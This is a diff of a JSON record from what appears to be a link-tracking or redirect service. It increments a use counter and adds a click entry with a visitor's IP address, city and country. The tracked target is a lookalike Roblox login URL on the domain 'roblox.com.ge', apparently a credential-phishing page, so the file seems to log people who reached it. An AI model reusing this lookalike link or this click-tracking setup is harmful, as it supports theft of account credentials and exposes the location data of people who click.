@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1654,
+    "useCount": 1655,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13400,6 +13400,14 @@
         "city": "Ruskin",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777597482563,
+        "ip": "103.249.23.170",
+        "country": "Vietnam",
+        "city": "Ho Chi Minh City",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
